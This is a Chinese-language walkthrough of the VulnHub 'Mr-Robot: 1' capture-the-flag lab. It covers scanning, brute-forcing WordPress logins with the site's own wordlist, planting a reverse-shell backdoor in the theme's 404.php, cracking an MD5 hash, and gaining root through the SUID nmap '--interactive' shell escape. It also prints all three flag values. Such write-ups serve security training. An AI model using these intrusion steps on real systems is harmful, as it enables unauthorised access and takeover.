# Mr-Robot: 1

2024-4-20 https://www.vulnhub.com/entry/mr-robot-1,151/

difficulty: beginner-intermediate

## IP

192.168.10.171

## Scan

Open Port -> 22,80,443

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
```

ssh 22 状态为 closed，先看看 80 和 443 上有什么信息，看到首页上是一些列视频。使用目录扫描工具，发现网站使用了 wordpress 搭建。

访问 http://192.168.10.171/robots 发现重要提示：

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

## flag1

访问 http://192.168.10.171/key-1-of-3.txt

```
073403c8a58a1f80d943455fb30724b9
```

查看另外一个文件 http://192.168.10.171/fsocity.dic ，显示的是一个单词列表，看起来中有用户名，也有密码，把它下载下来，进行内容去重：

```
cat fsocity.dic | sort | uniq > dict
```

尝试用得到的字典，在 wp 登陆页面，先尝试获得用户名：elliot、Elliot、ELLIOT；然后在用得到的用户名，去用同样的字典爆破，找到三个账号的密码都是：ER28-0652，登陆后发现这 3 个用户名对应的是一个账户，并且是 Administrator，所以在 wp 中可以插入 web shell。

在 404 提醒页面中插入我们的后门反弹连接代码，http://192.168.10.171/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen，点击下面的 update 进行保存。访问一个不存在的页面，触发这个 404.php 就能够触发反弹的连接：http://192.168.10.171/wp-admin/1111 ，在 kali 中使用 nc 进行监听。

得到反弹的 shell 后，先升级 tty: python -c 'import pty; pty.spawn("/bin/bash")'

在 /home/robot 目录下，我们发现了 key-2-of-3.txt ，但是目前没有权限读取，领完有一个 md5 的密码文件：password.raw-md5：

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

在 md5 网站查询，获得了明文： abcdefghijklmnopqrstuvwxyz

## flag2

切换到 robot 用户，读取到了 key-2-of-3.txt：

```
822c73956184f694993bede3eb39f959
```

## flag3

第 3 个 flag 估计是在 root 目录下。经过 linpeas 的枚举，发现一个 SUID 文件/usr/local/bin/nmap，进行利用获得 root 权限的 shell：

```
nmap --interactive
nmap> !sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
cd /root
# ls -al
ls -al
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
